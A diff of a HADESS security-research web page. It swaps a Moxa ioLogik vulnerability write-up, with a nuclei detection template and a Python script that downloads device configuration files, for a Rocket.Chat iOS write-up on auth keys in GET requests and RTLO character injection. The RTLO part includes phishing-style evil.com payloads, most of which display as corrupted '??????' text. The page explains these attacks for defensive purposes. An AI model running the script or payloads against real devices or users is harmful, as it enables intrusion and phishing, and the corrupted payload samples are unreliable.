-<li>Authentication Bypass: Certain vulnerabilities allow attackers to bypass authentication mechanisms, gaining unauthorized access to device settings and control interfaces without proper credentials.</li>
+<li>Multi-Platform Support: Rocket.Chat is available as a web application, desktop application, and mobile app for various platforms, including Windows, macOS, Linux, Android, and iOS. This ensures accessibility from virtually anywhere.</li>
 
 
 
-<li>Remote Code Execution: Exploitable vulnerabilities in ioLogik firmware facilitate remote code execution, empowering attackers to execute arbitrary commands with elevated privileges, potentially causing system-wide disruptions.</li>
+<li>File Sharing: Users can share files, images, documents, and other media within Rocket.Chat, making it easy to collaborate and exchange information seamlessly.</li>
+
+
+
+<li>Integration Hub: One of the standout features of Rocket.Chat is its extensive integration capabilities. It supports numerous third-party integrations, including popular productivity tools, project management software, and customer relationship management (CRM) systems. This allows organizations to consolidate their workflows and centralize communication.</li>
+
+
+
+<li>Customization: Rocket.Chat is highly customizable, allowing organizations to tailor the platform to their specific needs. It offers the ability to create custom themes, plugins, and integrations.</li>
+
+
+
+<li>Security: Security is a top priority for Rocket.Chat. It provides end-to-end encryption for one-on-one chats and offers various security features to protect sensitive information.</li>
+
+
+
+<li>Open Source: Being open source means that Rocket.Chat&#8217;s source code is freely available, and organizations can modify it to suit their unique requirements. This also encourages a vibrant community of developers and contributors.</li>
+
+
+
+<li>Enterprise Features: For larger organizations, Rocket.Chat offers enterprise-grade features such as user management, scalability, and advanced security options.</li>
+
+
+
+<li><strong>Community</strong> and Support: Rocket.Chat has an active and supportive community, providing resources, documentation, and forums for users and administrators. There are also options for professional support and managed hosting services.</li>
 </ul>
 
 
 
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="480" height="493" src="/wp-content/uploads/2024/01/image-6.png" alt="" class="wp-image-8315" style="width:480px;height:auto" srcset="/wp-content/uploads/2024/01/image-6.png 480w, /wp-content/uploads/2024/01/image-6-292x300.png 292w" sizes="(max-width: 480px) 100vw, 480px" /></figure>
+<h2 class="wp-block-heading" id="h-technical-analysis"><strong>Technical Analysis</strong></h2>
 
 
 
-<p class="wp-block-paragraph">Impact on Industrial Networks</p>
+<p class="wp-block-paragraph">Account takeover scenarios pose significant threats to the security and privacy of users of any application, particularly those that handle sensitive communication and data, such as the Rocket.Chat iOS application. In this comprehensive analysis, we&#8217;ll delve into a hypothetical account takeover scenario within the Rocket.Chat iOS app. This scenario involves the inadvertent exposure of an authentication key in a GET request and the subsequent unauthorized access through the /api/v1/users.info?userId endpoint. To illustrate the scenario, we&#8217;ll provide examples of both non-compliant and compliant iOS source code.</p>
 
 
 
-<p class="wp-block-paragraph">The implications of these vulnerabilities extend far beyond individual devices, posing significant risks to industrial networks&#8217; operational continuity, data confidentiality, and regulatory compliance. The compromised integrity of ioLogik devices can result in various detrimental outcomes, including:</p>
+<h3 class="wp-block-heading"><strong>Account Takeover Scenario Overview:</strong></h3>
 
 
 
 <ul class="wp-block-list">
-<li>Operational Disruption: Unauthorized access and control over ioLogik devices can lead to operational disruptions, downtime, and production delays, jeopardizing business continuity and revenue streams.</li>
+<li>Authentication Key in GET Request:</li>
 
 
 
-<li>Data Breaches: Breaching the confidentiality of industrial data stored and transmitted by ioLogik devices can result in sensitive information exposure, intellectual property theft, and regulatory non-compliance.</li>
+<li>The security issue begins with the unfortunate inclusion of sensitive authentication keys within the URL query string of a GET request. Normally, authentication information, such as API keys or tokens, should never be exposed in this manner. Query parameters in GET requests can be logged in various locations, including web server logs, browser history, and possibly third-party analytics services.</li>
 
 
 
-<li>Safety Risks: Compromised integrity of industrial control systems facilitated by vulnerable ioLogik devices can pose safety risks to personnel, assets, and the environment, endangering lives and livelihoods.</li>
+<li>Exploitation in /api/v1/users.info?userId:</li>
+
+
+
+<li>Rocket.Chat&#8217;s /api/v1/users.info endpoint allows users to retrieve user information by providing a userId parameter. In our scenario, an attacker discovers that the authentication key is exposed in the GET request, likely due to inadvertent exposure, poor security practices, or vulnerabilities in the application.</li>
+
+
+
+<li>Unauthorized Authorization:</li>
+
+
+
+<li>Equipped with the exposed authentication key, the attacker can craft their own GET requests to the /api/v1/users.info endpoint, replacing the legitimate userId parameter with the target victim&#8217;s userId. Since the authentication key is included, the system may erroneously authorize these requests, believing they originate from a legitimate source.</li>
+
+
+
+<li>Account Takeover and Unauthorized Access:</li>
+
+
+
+<li>With unauthorized access to a victim&#8217;s account information through the /api/v1/users.info endpoint, the attacker can potentially gain access to sensitive user data, including personal details, messages, and other confidential information. They may also manipulate the victim&#8217;s account settings or engage in malicious activities on their behalf, posing severe risks to user privacy and security.</li>
 </ul>
 
 
 
-<pre class="wp-block-code"><code>id: moxa-iologik-detection
-info:
-  name: Moxa ioLogik Detection
-  author: HADESS
-  severity: High
-  description: Detects Moxa ioLogik devices based on specific HTTP responses.
-requests:
-  - method: GET
-    path:
-      - /ik1212.txt
-    matchers-condition: OR
-    matchers:
-      - type: status
-        status:
-          - 200
-  - method: GET
-    matchers-condition: OR
-    path:
-      - /
-    matchers:
-      - type: word
-        words:
-          - "Welcome to ioLogik Series"
-    extractors:
-      - type: regex
-        regex: "Welcome to ioLogik Series"
-</code></pre>
+<h3 class="wp-block-heading"><strong>Non-Compliant iOS Source Code Example</strong></h3>
 
 
 
-<p class="wp-block-paragraph">Addressing the Security Concerns</p>
+<p class="wp-block-paragraph">Below is an example of non-compliant iOS source code that demonstrates the vulnerability described in the scenario:</p>
 
 
 
-<p class="wp-block-paragraph">In response to the identified vulnerabilities in the ioLogik series, Moxa has taken proactive measures to mitigate security risks and bolster the resilience of its products. These measures include:</p>
+<p class="wp-block-paragraph">let authKey = &#8220;YOUR_AUTHENTICATION_KEY&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">let userId = &#8220;VICTIM_USER_ID&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">// Vulnerable GET request with authentication key in the URL</p>
+
+
+
+<p class="wp-block-paragraph">let urlString = &#8220;https://your-rocket-chat-api.com/api/v1/users.info?userId=\(userId)&amp;authKey=\(authKey)&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">if let url = URL(string: urlString) {</p>
+
+
+
+<p class="wp-block-paragraph">let task = URLSession.shared.dataTask(with: url) { data, response, error in</p>
+
+
+
+<p class="wp-block-paragraph">// Handle the response here</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">task.resume()</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">Compliant iOS Source Code Example:</p>
+
+
+
+<p class="wp-block-paragraph">To address this security vulnerability, the following iOS source code example demonstrates best practices by using headers for authentication and secure handling of sensitive data:</p>
+
+
+
+<p class="wp-block-paragraph">let authKey = &#8220;YOUR_AUTHENTICATION_KEY&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">let userId = &#8220;VICTIM_USER_ID&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">let apiUrl = &#8220;https://your-rocket-chat-api.com/api/v1/users.info&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">if let url = URL(string: apiUrl) {</p>
+
+
+
+<p class="wp-block-paragraph">var request = URLRequest(url: url)</p>
+
+
+
+<p class="wp-block-paragraph">request.httpMethod = &#8220;GET&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">// Set headers for authentication</p>
+
+
+
+<p class="wp-block-paragraph">request.setValue(&#8220;Bearer \(authKey)&#8221;, forHTTPHeaderField: &#8220;Authorization&#8221;)</p>
+
+
+
+<p class="wp-block-paragraph">let task = URLSession.shared.dataTask(with: request) { data, response, error in</p>
+
+
+
+<p class="wp-block-paragraph">// Handle the response here</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">task.resume()</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">Mitigation and Prevention:</p>
+
+
+
+<p class="wp-block-paragraph">To prevent such an account takeover scenario in the Rocket.Chat iOS application, or any similar application, the following measures should be taken:</p>
 
 
 
 <ul class="wp-block-list">
-<li>Security Patches: Moxa has released firmware updates and security patches to address known vulnerabilities and enhance the robustness of ioLogik devices&#8217; security posture.</li>
+<li>API Key Protection: Avoid including sensitive information like authentication keys in GET requests. Instead, use appropriate methods like HTTP headers for authentication.</li>
 
 
 
-<li>Enhanced Authentication: Implementing robust authentication mechanisms, including multi-factor authentication (MFA) and role-based access control (RBAC), to prevent unauthorized access and ensure only authorized users can interact with the devices.</li>
+<li>Authorization Controls: Implement robust authorization checks on each API request to ensure that only authorized users can access specific endpoints and resources.</li>
 
 
 
-<li>Input Validation: Strengthening input validation mechanisms to thwart injection attacks and ensure that user inputs are properly sanitized to prevent exploitation of vulnerabilities.</li>
+<li>Security Audits: Regularly audit and review the application&#8217;s security practices, including API security, to identify and rectify vulnerabilities before they can be exploited.</li>
 
 
 
-<li>Security Awareness: Promoting security awareness among customers, partners, and stakeholders to educate them about potential risks and best practices for securing ioLogik devices and industrial networks.</li>
+<li>User Education: Educate users about security best practices, such as choosing strong passwords and enabling two-factor authentication to add an additional layer of account protection.</li>
+
+
+
+<li>Monitoring and Alerts: Set up monitoring and alerting systems to detect suspicious activities and unauthorized access attempts, allowing for rapid response and mitigation.</li>
 </ul>
 
 
 
-<p class="wp-block-paragraph">To fetch relay information from a device at http://192.168.1.100, run:</p>
+<p class="wp-block-paragraph">Right-to-Left Override (RTLO) character injection is a cunning text manipulation technique that poses a substantial security threat in various applications, including iOS applications like Rocket.Chat. In this in-depth article, we will delve into the intricacies of RTLO character injection. We&#8217;ll explore its potential risks, provide five example payloads to illustrate its danger, and discuss both non-compliant and compliant iOS source code. Furthermore, we will examine two methods by which malicious actors could potentially exploit RTLO character injection to run arbitrary code.</p>
 
 
 
-<p class="wp-block-paragraph">python iologik_script.py &#8211;url http://192.168.1.100</p>
+<h3 class="wp-block-heading"><strong>Understanding RTLO Character Injection</strong></h3>
 
 
 
-<p class="wp-block-paragraph">To download the configuration file from a device at http://192.168.1.100, run:</p>
+<p class="wp-block-paragraph">RTLO character injection is an ingenious method wherein specially crafted Unicode characters are utilized to manipulate the text&#8217;s directionality. The most notorious character used for this purpose is the &#8220;U+202E: Right-To-Left Override&#8221; character. When this character is inserted into text, it can reverse the display order of characters following it, leading to deceptive and malicious content.</p>
 
 
 
-<p class="wp-block-paragraph">python iologik_script.py &#8211;url http://192.168.1.100 &#8211;conf</p>
+<p class="wp-block-paragraph">Potential Risks:</p>
 
 
 
-<pre class="wp-block-code"><code>import requests
-import argparse
-
-def fetch_relay_information(url):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            relay_info = response.text  # Assuming relay information is in the response body
-            print("Relay Information:")
-            print(relay_info)
-        else:
-            print(f"Failed to fetch relay information. Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"Error fetching relay information: {e}")
-
-def download_configuration(url):
-    try:
-        response = requests.get(url + "/ik1212.txt")
-        if response.status_code == 200:
-            with open("ik1212.txt", "wb") as file:
-                file.write(response.content)
-            print("Configuration file downloaded successfully.")
-        else:
-            print(f"Failed to download configuration file. Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"Error downloading configuration file: {e}")
-
-def main():
-    parser = argparse.ArgumentParser(description="Moxa ioLogik E1212 Script")
-    parser.add_argument("--url", default="http://localhost", help="URL of the ioLogik E1212 device (default: http://localhost)")
-    parser.add_argument("--conf", action="store_true", help="Download configuration file /ik1212.txt")
-    args = parser.parse_args()
-
-    if args.conf:
-        download_configuration(args.url)
-    else:
-        fetch_relay_information(args.url)
-
-if __name__ == "__main__":
-    main()
-</code></pre>
+<h3 class="wp-block-heading"><strong>RTLO character injection carries significant risks</strong></h3>
 
 
 
-<h2 class="wp-block-heading"><strong>Conclusion</strong></h2>
+<ul class="wp-block-list">
+<li>Phishing Attacks: Attackers can use RTLO characters to disguise malicious URLs, tricking users into clicking on harmful links.</li>
 
 
 
-<p class="wp-block-paragraph">In the intricate tapestry of cybersecurity, vulnerabilities such as CSRF, XSS, cryptography failures, and broken access controls emerge as critical threads that can unravel the entire fabric if not addressed promptly. Our analysis underscores the profound implications of these vulnerabilities, each of which can serve as a potential gateway for malicious actors.</p>
+<li>Social Engineering: By manipulating text directionality, attackers can alter the appearance of names or messages, leading users to trust malicious actors.</li>
 
 
 
-<p class="wp-block-paragraph">The exploitation of CSRF to change passwords underscores the importance of ensuring that every request made to a web application is genuine and authorized. Without robust CSRF protections, attackers can manipulate users into performing unintended actions, leading directly to account takeovers. Similarly, XSS vulnerabilities, which allow attackers to inject malicious scripts into web pages, can compromise user sessions and provide unauthorized access to accounts, emphasizing the need for stringent input validation and output encoding.</p>
+<li>Malware Distribution: Concealing malicious file extensions in filenames can deceive users into downloading and executing harmful files.</li>
 
 
 
-<p class="wp-block-paragraph">Cryptography, the bedrock of data security, when compromised, can expose sensitive information, making systems susceptible to data breaches and espionage. The use of outdated or weak cryptographic algorithms can jeopardize the entire security infrastructure of an organization. Lastly, broken access controls, which determine who can access specific resources, can lead to unauthorized data access, system compromises, and potential exposure of confidential information when not properly implemented.</p>
+<li>Bypassing Security Scanners: RTLO characters can evade security scanners and filters, allowing malicious content to bypass detection.</li>
+</ul>
 
 
 
-<p class="wp-block-paragraph">Collectively, these vulnerabilities highlight the interconnected nature of web security. Addressing one vulnerability in isolation is insufficient; a holistic approach is imperative. Organizations must prioritize regular security audits, adopt best practices in web development, and invest in continuous training to stay ahead of potential threats. In an era where digital interactions are the norm, ensuring the security of these interactions is paramount.</p>
+<h3 class="wp-block-heading"><strong>Mitigation Strategies</strong></h3>
+
+
+
+<p class="wp-block-paragraph">To protect iOS applications like Rocket.Chat from RTLO character injection, consider the following strategies:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Input Validation: Implement input validation to filter and neutralize RTLO characters in user-generated content.</li>
+
+
+
+<li>Content Filtering: Deploy content filtering mechanisms to detect and prevent the injection of malicious characters.</li>
+</ul>
+
+
+
+<ul class="wp-block-list">
+<li>User Education: Educate users about recognizing and avoiding suspicious content that may contain RTLO characters.</li>
+
+
+
+<li>Character Whitelisting: Allow only known-safe characters in user-generated content and reject anything that deviates from the whitelist.</li>
+
+
+
+<li>Security Audits: Regularly audit and review the application&#8217;s security practices, including API security, to identify and fix vulnerabilities related to RTLO character injection.</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading"><strong>Example Payloads</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Here are five example payloads that demonstrate how RTLO characters can be used maliciously:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Phishing URL: www.evil.com/??????????.???</li>
+
+
+
+<li>Social Engineering: ??????????????????</li>
+
+
+
+<li>Misleading File Name: important_document.pdf‮</li>
+
+
+
+<li>Security Confusion: ????????????????.exe</li>
+
+
+
+<li>Invisible Payload: malicious-script.???</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading"><strong>Non-Compliant iOS Source Code</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Below is an example of non-compliant iOS source code that does not address RTLO character injection:</p>
+
+
+
+<p class="wp-block-paragraph">let message = &#8220;Click here to visit our website: www.evil.com/??????????.???&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">label.text = message</p>
+
+
+
+<p class="wp-block-paragraph">Compliant iOS Source Code:</p>
+
+
+
+<p class="wp-block-paragraph">To mitigate the risks associated with RTLO character injection, use input validation and character whitelisting in your iOS source code, like this:</p>
+
+
+
+<p class="wp-block-paragraph">let message = &#8220;Click here to visit our website: www.evil.com/??????????.???&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">let sanitizedMessage = sanitizeRTLOCharacters(message)</p>
+
+
+
+<p class="wp-block-paragraph">label.text = sanitizedMessage</p>
+
+
+
+<p class="wp-block-paragraph">func sanitizeRTLOCharacters(_ input: String) -&gt; String {</p>
+
+
+
+<p class="wp-block-paragraph">// Implement a function to remove or neutralize RTLO characters</p>
+
+
+
+<p class="wp-block-paragraph">// Example: Remove U+202E character</p>
+
+
+
+<p class="wp-block-paragraph">let sanitizedInput = input.replacingOccurrences(of: &#8220;\u{202E}&#8221;, with: &#8220;&#8221;)</p>
+
+
+
+<p class="wp-block-paragraph">return sanitizedInput</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<h3 class="wp-block-heading"><strong>Exploiting RTLO Character Injection to Run Arbitrary Code</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Malicious actors may attempt to leverage RTLO character injection to run arbitrary code within an application. Here are two potential methods:</p>
+
+
+
+<ul class="wp-block-list">
+<li>URL Redirection to a Malicious JavaScript File:</li>
+
+
+
+<li>By injecting RTLO characters into a URL, an attacker could craft a deceptive link that appears benign but redirects the user to a malicious JavaScript file. Once executed, this JavaScript can perform arbitrary actions on the user&#8217;s device, such as data theft or unauthorized access.</li>
+
+
+
+<li>Example Payload:</li>
+
+
+
+<li>https://www.example.com/malicious.js%e2%80%ae%e2%80%ae%e2%80%ae%e2%80%ae%e2%80%ae%e2%80%ae%e2%80%ae</li>
+
+
+
+<li>Social Engineering for Code Execution:</li>
+
+
+
+<li>By altering the appearance of a message or notification through RTLO character injection, an attacker may deceive the user into executing a malicious action. For instance, the attacker could manipulate a message to look like a system update prompt, tricking the user into executing arbitrary code.</li>
+</ul>
+
+
+
+<h2 class="wp-block-heading" id="h-conclusion"><strong>Conclusion</strong></h2>
+
+
+
+<p class="wp-block-paragraph">In this discussion, we&#8217;ve explored two critical security vulnerabilities: exposing authentication tokens in GET requests with shared functionality and running arbitrary code using Right-to-Left Override (RTLO) character injection. Both of these vulnerabilities can have significant consequences for the security and privacy of applications and their users.</p>
+
+
+
+<h3 class="wp-block-heading"><strong>Exposing Auth Token in GET Requests with Share Functionality</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Exposing authentication tokens in GET requests, especially when shared through functionality like sharing links or URLs, is a substantial security risk. It can lead to unauthorized access, data breaches, and misuse of sensitive information. To mitigate this risk:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Implement secure practices for handling authentication tokens, such as using HTTP headers or secure cookies instead of including them in URLs.</li>
+
+
+
+<li>Apply proper access controls and authorization checks to ensure that sensitive operations are only performed by authorized users.</li>
+
+
+
+<li>Regularly audit and review the application&#8217;s security measures, including token handling and sharing functionality, to identify and address vulnerabilities.</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading"><strong>Running Arbitrary Code with RTLO Character Injection</strong></h3>
+
+
+
+<p class="wp-block-paragraph">RTLO character injection is a sophisticated technique that manipulates text directionality to deceive users and potentially execute malicious actions. It poses risks such as phishing attacks, social engineering, and code execution. To defend against RTLO character injection:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Implement input validation and content filtering to neutralize or remove RTLO characters from user-generated content.</li>
+
+
+
+<li>Educate users about recognizing suspicious content and links that may contain RTLO characters.</li>
+
+
+
+<li>Stay updated on security best practices and conduct regular security audits to identify and mitigate vulnerabilities.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Discovered by <a href="/"><mark style="background-color:rgba(0, 0, 0, 0);color:#6b10f4" class="has-inline-color">HADESS</mark></a></strong></p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -2157,27 +2120,27 @@ if __name__ == "__main__":
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -2304,11 +2267,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -2331,59 +2294,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
